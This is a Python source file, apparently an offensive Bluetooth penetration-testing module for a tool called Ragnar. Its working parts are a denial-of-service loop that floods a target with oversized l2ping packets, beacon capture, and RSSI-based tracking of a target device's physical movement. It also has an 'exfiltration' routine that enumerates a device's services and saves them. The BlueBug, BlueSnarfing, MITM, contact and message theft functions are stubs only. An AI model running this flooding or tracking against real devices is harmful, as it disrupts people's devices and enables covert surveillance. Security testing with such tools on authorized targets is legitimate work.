#!/usr/bin/env python3
"""
Bluetooth Penetration Testing Module for Ragnar
Adds offensive security capabilities for Bluetooth devices
Includes data exfiltration, active attacks, beacon tracking, and MITM

WARNING: This module contains offensive security tools.
Only use on systems you own or have explicit permission to test.
"""

import os
import sys
import time
import json
import struct
import logging
import subprocess
import threading
import queue
from typing import Dict, List, Optional, Tuple, Any, Set
from datetime import datetime
from pathlib import Path

try:
    import bluetooth  # pybluez
    HAS_PYBLUEZ = True
except ImportError:
    HAS_PYBLUEZ = False

try:
    from scapy.all import *
    from scapy.layers.bluetooth import *
    HAS_SCAPY = False  # Scapy Bluetooth support is limited
except ImportError:
    HAS_SCAPY = False

# Required attributes for Ragnar action framework
b_class = "BLE_Pentest"
b_status = "bluetooth_pentest"
b_port = None
b_parent = None


class BluetoothPentest:
    """
    Advanced Bluetooth penetration testing capabilities
    Extends basic Bluetooth functionality with offensive security features
    """
    
    def __init__(self, logger=None):
        self.logger = logger or logging.getLogger(__name__)
        self.running = False
        self.discovered_beacons = {}
        self.tracked_devices = {}
        self.exfiltrated_data = {}
        self.attack_results = {}
        
        # Check for required dependencies
        if not HAS_PYBLUEZ:
            self.logger.warning("PyBluez not installed. Some features will be limited.")
            self.logger.info("Install with: pip install pybluez")
        
        self.logger.info("BluetoothPentest module initialized")
    
    # ============================================================================
    # BEACON TRACKING (iBeacon, Eddystone, etc.)
    # ============================================================================
    
    def start_beacon_tracking(self, duration: int = 60) -> Dict[str, Any]:
        """
        Track Bluetooth beacons (iBeacon, Eddystone, AltBeacon)
        Useful for tracking people/devices via beacon advertisements
        
        Args:
            duration: How long to track in seconds
            
        Returns:
            Dictionary of discovered beacons with their data
        """
        self.logger.info(f"Starting beacon tracking for {duration} seconds...")
        
        beacons = {}
        start_time = time.time()
        
        try:
            # Use hcitool and hcidump to capture BLE advertisements
            # This requires root/sudo privileges
            
            # Start hcidump in background to capture advertisements
            hcidump_cmd = ['hcidump', '--raw']
            proc = subprocess.Popen(
                hcidump_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            self.logger.info("Capturing BLE advertisements...")
            
            # Parse hcidump output for beacon data
            while time.time() - start_time < duration:
                line = proc.stdout.readline()
                if not line:
                    break
                
                # Parse beacon advertisements
                beacon_data = self._parse_beacon_advertisement(line)
                if beacon_data:
                    beacon_id = beacon_data.get('uuid') or beacon_data.get('address')
                    if beacon_id:
                        if beacon_id not in beacons:
                            beacons[beacon_id] = {
                                'first_seen': time.time(),
                                'last_seen': time.time(),
                                'count': 1,
                                'data': beacon_data
                            }
                        else:
                            beacons[beacon_id]['last_seen'] = time.time()
                            beacons[beacon_id]['count'] += 1
                            # Update RSSI if available
                            if 'rssi' in beacon_data:
                                beacons[beacon_id]['data']['rssi'] = beacon_data['rssi']
            
            # Clean up
            proc.terminate()
            proc.wait(timeout=2)
            
        except FileNotFoundError:
            self.logger.error("hcidump not found. Install with: apt-get install bluez-hcidump")
            return {'error': 'hcidump not available', 'beacons': {}}
        except Exception as e:
            self.logger.error(f"Error during beacon tracking: {e}")
            return {'error': str(e), 'beacons': beacons}
        
        self.discovered_beacons = beacons
        self.logger.info(f"Beacon tracking complete. Found {len(beacons)} unique beacons")
        
        return {
            'success': True,
            'duration': duration,
            'beacons_found': len(beacons),
            'beacons': beacons
        }
    
    def _parse_beacon_advertisement(self, raw_data: str) -> Optional[Dict[str, Any]]:
        """
        Parse raw BLE advertisement data to detect beacons
        Supports iBeacon, Eddystone, and AltBeacon formats
        """
        try:
            # This is a simplified parser - real implementation would need
            # full BLE advertisement packet parsing
            
            # iBeacon format: Company ID (Apple) + iBeacon prefix + UUID + Major + Minor + TX Power
            if '4c00' in raw_data.lower():  # Apple company ID
                # Simplified detection - real parser would extract UUID, major, minor
                return {
                    'type': 'iBeacon',
                    'company': 'Apple',
                    'raw': raw_data,
                    'timestamp': time.time()
                }
            
            # Eddystone format: Google's beacon format
            if 'aafe' in raw_data.lower():  # Eddystone service UUID
                return {
                    'type': 'Eddystone',
                    'company': 'Google',
                    'raw': raw_data,
                    'timestamp': time.time()
                }
            
            return None
            
        except Exception as e:
            self.logger.debug(f"Error parsing beacon data: {e}")
            return None
    
    def track_device_movement(self, target_address: str, duration: int = 300) -> List[Dict[str, Any]]:
        """
        Track a specific Bluetooth device's presence and signal strength over time
        Useful for tracking physical movement/proximity
        
        Args:
            target_address: MAC address of target device
            duration: How long to track in seconds
            
        Returns:
            List of signal strength readings over time
        """
        self.logger.info(f"Tracking device {target_address} for {duration} seconds...")
        
        readings = []
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                # Query device RSSI
                result = subprocess.run(
                    ['bluetoothctl', 'info', target_address],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                
                if result.returncode == 0:
                    # Parse RSSI from output
                    for line in result.stdout.split('\n'):
                        if 'RSSI:' in line:
                            try:
                                rssi = int(line.split(':')[1].strip())
                                reading = {
                                    'timestamp': time.time(),
                                    'rssi': rssi,
                                    'distance_estimate': self._estimate_distance_from_rssi(rssi)
                                }
                                readings.append(reading)
                                self.logger.debug(f"RSSI: {rssi} dBm, Est. distance: {reading['distance_estimate']:.2f}m")
                            except (ValueError, IndexError):
                                pass
                
                time.sleep(2)  # Sample every 2 seconds
                
            except Exception as e:
                self.logger.debug(f"Error reading RSSI: {e}")
                time.sleep(2)
        
        self.logger.info(f"Tracking complete. Collected {len(readings)} readings")
        return readings
    
    def _estimate_distance_from_rssi(self, rssi: int, tx_power: int = -59) -> float:
        """
        Estimate distance in meters from RSSI value
        This is approximate and affected by obstacles, interference, etc.
        
        Args:
            rssi: Received Signal Strength Indicator in dBm
            tx_power: Transmit power at 1 meter (default -59 for most devices)
            
        Returns:
            Estimated distance in meters
        """
        if rssi == 0:
            return -1.0
        
        ratio = rssi * 1.0 / tx_power
        if ratio < 1.0:
            return ratio ** 10
        else:
            return (0.89976) * (ratio ** 7.7095) + 0.111
    
    # ============================================================================
    # DATA EXFILTRATION
    # ============================================================================
    
    def exfiltrate_device_info(self, target_address: str) -> Dict[str, Any]:
        """
        Extract all available information from a target Bluetooth device
        Includes services, characteristics, device info, and any readable data
        
        Args:
            target_address: MAC address of target device
            
        Returns:
            Dictionary containing all extracted information
        """
        self.logger.info(f"Attempting data exfiltration from {target_address}...")
        
        exfil_data = {
            'target': target_address,
            'timestamp': time.time(),
            'device_info': {},
            'services': [],
            'characteristics': [],
            'files': [],
            'contacts': [],
            'messages': [],
            'errors': []
        }
        
        try:
            # 1. Get basic device information
            exfil_data['device_info'] = self._get_detailed_device_info(target_address)
            
            # 2. Enumerate all services
            exfil_data['services'] = self._enumerate_services(target_address)
            
            # 3. Try to read GATT characteristics (BLE devices)
            exfil_data['characteristics'] = self._read_gatt_characteristics(target_address)
            
            # 4. Attempt OBEX file transfer (if supported)
            files = self._attempt_obex_transfer(target_address)
            if files:
                exfil_data['files'] = files
            
            # 5. Try to extract contacts via PBAP (Phone Book Access Profile)
            contacts = self._extract_contacts_pbap(target_address)
            if contacts:
                exfil_data['contacts'] = contacts
            
            # 6. Try to extract messages via MAP (Message Access Profile)
            messages = self._extract_messages_map(target_address)
            if messages:
                exfil_data['messages'] = messages
            
            self.exfiltrated_data[target_address] = exfil_data
            
            # Save to file
            self._save_exfiltrated_data(target_address, exfil_data)
            
            self.logger.info(f"Data exfiltration complete for {target_address}")
            return exfil_data
            
        except Exception as e:
            self.logger.error(f"Error during data exfiltration: {e}")
            exfil_data['errors'].append(str(e))
            return exfil_data
    
    def _get_detailed_device_info(self, address: str) -> Dict[str, Any]:
        """Get comprehensive device information"""
        info = {}
        
        try:
            result = subprocess.run(
                ['bluetoothctl', 'info', address],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    line = line.strip()
                    if ':' in line:
                        key, value = line.split(':', 1)
                        info[key.strip().lower().replace(' ', '_')] = value.strip()
        except Exception as e:
            self.logger.debug(f"Error getting device info: {e}")
        
        return info
    
    def _enumerate_services(self, address: str) -> List[Dict[str, str]]:
        """Enumerate all Bluetooth services on target device"""
        services = []
        
        if not HAS_PYBLUEZ:
            self.logger.warning("PyBluez required for service enumeration")
            return services
        
        try:
            self.logger.info(f"Enumerating services on {address}...")
            
            # Use PyBluez to discover services
            service_list = bluetooth.find_service(address=address)
            
            for service in service_list:
                services.append({
                    'name': service.get('name', 'Unknown'),
                    'description': service.get('description', ''),
                    'protocol': service.get('protocol', ''),
                    'port': service.get('port', ''),
                    'service_classes': str(service.get('service-classes', [])),
                    'profiles': str(service.get('profiles', [])),
                    'service_id': service.get('service-id', '')
                })
            
            self.logger.info(f"Found {len(services)} services")
            
        except Exception as e:
            self.logger.error(f"Service enumeration failed: {e}")
        
        return services
    
    def _read_gatt_characteristics(self, address: str) -> List[Dict[str, Any]]:
        """
        Read GATT characteristics from BLE device
        Requires gatttool or similar
        """
        characteristics = []
        
        try:
            # Use gatttool to read characteristics
            result = subprocess.run(
                ['gatttool', '-b', address, '--characteristics'],
                capture_output=True,
                text=True,
                timeout=15
            )
            
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'char' in line.lower():
                        # Parse characteristic handle and UUID
                        characteristics.append({
                            'raw': line.strip(),
                            'timestamp': time.time()
                        })
            
        except FileNotFoundError:
            self.logger.debug("gatttool not available")
        except Exception as e:
            self.logger.debug(f"GATT characteristic read failed: {e}")
        
        return characteristics
    
    def _attempt_obex_transfer(self, address: str) -> List[str]:
        """
        Attempt to transfer files via OBEX (Object Exchange)
        Used by file transfer profile (FTP)
        """
        files = []
        
        try:
            # Check if OBEX FTP service is available
            # This would require obexftp tool or similar
            self.logger.debug(f"Checking OBEX FTP availability on {address}")
            
            # Placeholder - real implementation would use obexftp
            # obexftp -b <address> -l
            
        except Exception as e:
            self.logger.debug(f"OBEX transfer failed: {e}")
        
        return files
    
    def _extract_contacts_pbap(self, address: str) -> List[Dict[str, str]]:
        """
        Extract contacts via Phone Book Access Profile (PBAP)
        Requires device to be paired and PBAP enabled
        """
        contacts = []
        
        try:
            # PBAP extraction would require specific tools or libraries
            # This is a placeholder for the functionality
            self.logger.debug(f"Attempting PBAP contact extraction from {address}")
            
        except Exception as e:
            self.logger.debug(f"PBAP extraction failed: {e}")
        
        return contacts
    
    def _extract_messages_map(self, address: str) -> List[Dict[str, str]]:
        """
        Extract messages via Message Access Profile (MAP)
        Requires device to be paired and MAP enabled
        """
        messages = []
        
        try:
            # MAP extraction would require specific tools
            self.logger.debug(f"Attempting MAP message extraction from {address}")
            
        except Exception as e:
            self.logger.debug(f"MAP extraction failed: {e}")
        
        return messages
    
    def _save_exfiltrated_data(self, address: str, data: Dict[str, Any]):
        """Save exfiltrated data to file"""
        try:
            output_dir = Path('data/output/bluetooth_exfiltration')
            output_dir.mkdir(parents=True, exist_ok=True)
            
            filename = f"exfil_{address.replace(':', '-')}_{int(time.time())}.json"
            filepath = output_dir / filename
            
            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2, default=str)
            
            self.logger.info(f"Exfiltrated data saved to {filepath}")
            
        except Exception as e:
            self.logger.error(f"Failed to save exfiltrated data: {e}")
    
    # ============================================================================
    # BLUETOOTH ATTACKS
    # ============================================================================
    
    def bluebug_attack(self, target_address: str) -> Dict[str, Any]:
        """
        Attempt BlueBug attack - unauthorized access to phone features
        Exploits weak implementations of OBEX protocol
        
        WARNING: This is for authorized testing only!
        """
        self.logger.warning(f"Attempting BlueBug attack on {target_address}")
        
        result = {
            'attack': 'BlueBug',
            'target': target_address,
            'timestamp': time.time(),
            'success': False,
            'data': {}
        }
        
        try:
            # BlueBug attack implementation would go here
            # This requires low-level Bluetooth stack access
            self.logger.info("BlueBug attack simulation - real implementation requires specialized tools")
            
            # Placeholder for actual attack
            result['status'] = 'Not implemented - requires specialized Bluetooth stack'
            
        except Exception as e:
            result['error'] = str(e)
            self.logger.error(f"BlueBug attack failed: {e}")
        
        self.attack_results[f"bluebug_{target_address}"] = result
        return result
    
    def bluesnarfing_attack(self, target_address: str) -> Dict[str, Any]:
        """
        Attempt BlueSnarfing attack - unauthorized data theft
        Exploits weak pairing/authentication
        
        WARNING: This is for authorized testing only!
        """
        self.logger.warning(f"Attempting BlueSnarfing attack on {target_address}")
        
        result = {
            'attack': 'BlueSnarfing',
            'target': target_address,
            'timestamp': time.time(),
            'success': False,
            'stolen_data': []
        }
        
        try:
            # BlueSnarfing implementation
            # Attempts to read data without pairing
            self.logger.info("BlueSnarfing simulation - attempting unauthorized data access")
            
            # Try to connect and read data without proper authentication
            # This is a simplified placeholder
            
            result['status'] = 'Not implemented - requires OBEX vulnerability exploitation'
            
        except Exception as e:
            result['error'] = str(e)
            self.logger.error(f"BlueSnarfing attack failed: {e}")
        
        self.attack_results[f"bluesnarf_{target_address}"] = result
        return result
    
    def blueborne_scan(self, target_address: str) -> Dict[str, Any]:
        """
        Scan for BlueBorne vulnerabilities (CVE-2017-0781, CVE-2017-0782, etc.)
        Checks if device is vulnerable to BlueBorne exploits
        
        WARNING: Scanning only - does not exploit!
        """
        self.logger.info(f"Scanning {target_address} for BlueBorne vulnerabilities...")
        
        result = {
            'scan': 'BlueBorne',
            'target': target_address,
            'timestamp': time.time(),
            'vulnerable': False,
            'vulnerabilities': []
        }
        
        try:
            # Get device information
            device_info = self._get_detailed_device_info(target_address)
            
            # Check OS and version (if available)
            # BlueBorne affects Android, Linux, Windows, iOS
            
            # Simplified vulnerability detection
            # Real implementation would need to:
            # 1. Identify OS and version
            # 2. Check against known vulnerable versions
            # 3. Test specific BlueBorne vectors
            
            self.logger.info("BlueBorne vulnerability scan - checking known vulnerable versions")
            
            result['device_info'] = device_info
            result['status'] = 'Scan complete - manual verification recommended'
            
        except Exception as e:
            result['error'] = str(e)
            self.logger.error(f"BlueBorne scan failed: {e}")
        
        return result
    
    def dos_attack(self, target_address: str, duration: int = 30) -> Dict[str, Any]:
        """
        Bluetooth Denial of Service attack
        Floods target with connection requests or malformed packets
        
        WARNING: This is for authorized testing only!
        """
        self.logger.warning(f"Attempting DoS attack on {target_address} for {duration} seconds")
        
        result = {
            'attack': 'DoS',
            'target': target_address,
            'timestamp': time.time(),
            'duration': duration,
            'packets_sent': 0
        }
        
        try:
            start_time = time.time()
            
            # Simple L2CAP ping flood
            while time.time() - start_time < duration:
                try:
                    # Use l2ping for DoS
                    subprocess.run(
                        ['l2ping', '-c', '1', '-s', '600', target_address],
                        capture_output=True,
                        timeout=1
                    )
                    result['packets_sent'] += 1
                except subprocess.TimeoutExpired:
                    result['packets_sent'] += 1
                except Exception:
                    pass
            
            self.logger.info(f"DoS attack complete. Sent {result['packets_sent']} packets")
            
        except FileNotFoundError:
            result['error'] = 'l2ping not found - install bluez tools'
            self.logger.error("l2ping tool not available")
        except Exception as e:
            result['error'] = str(e)
            self.logger.error(f"DoS attack failed: {e}")
        
        self.attack_results[f"dos_{target_address}"] = result
        return result
    
    # ============================================================================
    # MAN-IN-THE-MIDDLE (MITM) ATTACKS
    # ============================================================================
    
    def mitm_setup(self, target1: str, target2: str) -> Dict[str, Any]:
        """
        Set up Man-in-the-Middle position between two Bluetooth devices
        Intercepts and relays traffic between devices
        
        WARNING: This is for authorized testing only!
        """
        self.logger.warning(f"Setting up MITM between {target1} and {target2}")
        
        result = {
            'attack': 'MITM',
            'target1': target1,
            'target2': target2,
            'timestamp': time.time(),
            'success': False,
            'intercepted_data': []
        }
        
        try:
            # MITM for Bluetooth requires:
            # 1. Forcing both devices to unpair
            # 2. Impersonating each device to the other
            # 3. Relaying all traffic while capturing
            
            self.logger.info("MITM attack setup - requires BT stack manipulation")
            
            # This is extremely complex and requires:
            # - Custom Bluetooth stack
            # - Ability to spoof MAC addresses
            # - Real-time packet manipulation
            
            result['status'] = 'Not implemented - requires specialized hardware and software'
            
        except Exception as e:
            result['error'] = str(e)
            self.logger.error(f"MITM setup failed: {e}")
        
        return result
    
    def mitm_intercept(self, duration: int = 60) -> List[Dict[str, Any]]:
        """
        Intercept and log Bluetooth traffic during active MITM
        
        Args:
            duration: How long to intercept in seconds
            
        Returns:
            List of intercepted packets/data
        """
        self.logger.info(f"Starting traffic interception for {duration} seconds...")
        
        intercepted = []
        
        try:
            # Would capture and log all Bluetooth traffic
            # Requires btmon or similar packet capture tool
            
            start_time = time.time()
            
            # Use btmon to capture traffic
            proc = subprocess.Popen(
                ['btmon'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            while time.time() - start_time < duration:
                line = proc.stdout.readline()
                if line:
                    intercepted.append({
                        'timestamp': time.time(),
                        'data': line.strip()
                    })
            
            proc.terminate()
            
        except FileNotFoundError:
            self.logger.error("btmon not found - install bluez tools")
        except Exception as e:
            self.logger.error(f"Traffic interception failed: {e}")
        
        self.logger.info(f"Intercepted {len(intercepted)} packets")
        return intercepted
    
    # ============================================================================
    # UTILITY FUNCTIONS
    # ============================================================================
    
    def generate_report(self, output_file: Optional[str] = None) -> Dict[str, Any]:
        """
        Generate comprehensive pentest report
        
        Args:
            output_file: Optional path to save report
            
        Returns:
            Complete report dictionary
        """
        report = {
            'timestamp': time.time(),
            'beacons_discovered': len(self.discovered_beacons),
            'devices_tracked': len(self.tracked_devices),
            'exfiltration_attempts': len(self.exfiltrated_data),
            'attacks_performed': len(self.attack_results),
            'beacons': self.discovered_beacons,
            'tracked_devices': self.tracked_devices,
            'exfiltrated_data': self.exfiltrated_data,
            'attack_results': self.attack_results
        }
        
        if output_file:
            try:
                with open(output_file, 'w') as f:
                    json.dump(report, f, indent=2, default=str)
                self.logger.info(f"Report saved to {output_file}")
            except Exception as e:
                self.logger.error(f"Failed to save report: {e}")
        
        return report


# Ragnar action wrapper
class BLEPentest:
    """
    Ragnar action wrapper for Bluetooth penetration testing
    """
    
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.action_name = "BLEPentest"
        self.port = 0  # Standalone action
        self.b_parent_action = None
        self.logger = logging.getLogger(__name__)
        self.pentest = BluetoothPentest(self.logger)
    
    def execute(self):
        """Execute Bluetooth pentest scan"""
        try:
            self.logger.info("ðŸ”´ Starting Bluetooth Penetration Test...")
            
            # 1. Track beacons
            beacon_results = self.pentest.start_beacon_tracking(duration=30)
            
            # 2. Generate report
            report_file = f"data/output/bluetooth_pentest_{int(time.time())}.json"
            self.pentest.generate_report(output_file=report_file)
            
            self.logger.info("âœ“ Bluetooth pentest complete")
            return 'success'
            
        except Exception as e:
            self.logger.error(f"Bluetooth pentest failed: {e}")
            return 'failed'


if __name__ == "__main__":
    # Testing
    logging.basicConfig(level=logging.INFO)
    logger = logging.getLogger(__name__)
    
    print("ðŸ”´ Bluetooth Penetration Testing Module")
    print("=" * 50)
    print("WARNING: Only use on authorized systems!")
    print("=" * 50)
    
    pentest = BluetoothPentest(logger)
    
    # Example: Track beacons
    print("\n[*] Starting beacon tracking...")
    results = pentest.start_beacon_tracking(duration=10)
    print(f"Found {results.get('beacons_found', 0)} beacons")
    
    print("\n[*] Pentest module loaded successfully")
